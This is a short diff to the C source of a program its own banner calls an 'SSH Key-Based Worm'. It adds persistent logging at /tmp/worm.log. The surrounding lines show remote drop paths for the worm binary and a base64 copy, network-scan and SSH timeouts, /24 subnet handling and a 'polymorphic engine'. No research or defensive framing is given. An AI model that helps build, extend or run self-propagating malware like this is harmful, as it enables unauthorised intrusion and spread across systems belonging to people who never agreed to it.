@@ -24,6 +24,7 @@
 #define CHUNK_SIZE 4000
 #define REMOTE_WORM_PATH "/tmp/worm"
 #define REMOTE_B64_PATH "/tmp/worm.b64"
+#define WORM_LOG_PATH "/tmp/worm.log"
 #define SCAN_TIMEOUT 2
 #define SSH_TIMEOUT 10
 
@@ -796,6 +797,21 @@ void get_net_24(const char *ip, char *out) {
 
 int main(int argc, char* argv[]) {
     (void)argc;  // Suppress unused parameter warning
+    
+    // Redirect stdout and stderr to log file for persistent logging
+    // This allows us to view worm activity via: tail -f /tmp/worm.log
+    FILE* log_file = freopen(WORM_LOG_PATH, "a", stdout);
+    if (log_file == NULL) {
+        // If we can't open log file, continue without logging
+        // (this allows worm to still work even if log file can't be created)
+    }
+    // Also redirect stderr to the same log file
+    freopen(WORM_LOG_PATH, "a", stderr);
+    
+    // Flush to ensure logs are written immediately
+    setbuf(stdout, NULL);
+    setbuf(stderr, NULL);
+    
     printf("=== C SSH Key-Based Worm ===\n");
     
     // Initialize random seed for polymorphic engine
